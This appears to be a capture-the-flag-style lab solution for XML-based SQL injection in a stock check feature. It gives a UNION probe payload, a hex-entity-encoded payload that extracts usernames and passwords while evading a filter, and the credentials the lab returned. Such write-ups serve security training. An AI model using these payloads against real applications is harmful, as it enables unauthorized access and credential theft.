# Description
This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

The database contains a `users` table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.
# Solution
1) Verify whether server handles SQL query:
```
<storeId>1 UNION SELECT NULL</storeId>
```

2) Use **Hackvertor** to retrieve user and password:
```
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
```
- Hackvertor is used for encoding, converting to other format.
- We change to HTML character entity by `<@hex_entities>` because of XML-based SQLi.

**Output:**
```
wiener~m5q0tiz5ba78gzbsqnxn
516 units
carlos~vbch99ig7hqy02wqgldi
administrator~wuohylzcupvqv1rld2pn
```